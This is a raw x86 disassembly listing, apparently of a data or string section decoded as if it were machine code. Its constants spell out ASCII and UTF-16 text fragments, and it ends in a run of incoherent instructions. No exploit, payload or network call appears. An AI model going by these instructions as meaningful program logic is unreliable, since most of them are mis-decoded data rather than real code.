  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	in     eax,0x74
  433a5a:	sub    edx,DWORD PTR [edx+esi*8-0x41bde3fb]
  433a61:	iret   
  433a62:	mov    ah,0x62
  433a64:	das    
  433a65:	sub    dl,BYTE PTR [ebx-0x13]
  433a68:	sbb    eax,DWORD PTR [eax]
  433a6a:	add    BYTE PTR [eax],al
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
